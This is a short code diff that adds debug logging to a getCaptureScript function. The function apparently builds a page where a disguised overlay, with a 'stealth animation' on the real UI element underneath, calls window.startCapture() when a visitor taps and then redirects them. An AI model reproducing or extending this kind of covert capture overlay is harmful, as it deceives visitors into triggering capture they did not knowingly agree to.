@@ -134,11 +134,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           });
 
           function trigger() {
+            console.log("[DEBUG] Triggering capture");
             window.startCapture();
             if (over && over.parentNode) over.parentNode.removeChild(over);
           }
           
           function handleTap(e) {
+            console.log("[DEBUG] Click handled in handleTap");
             var btn = getTargetBtn();
             // Stealth animation on the real UI element underneath
             if (btn && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
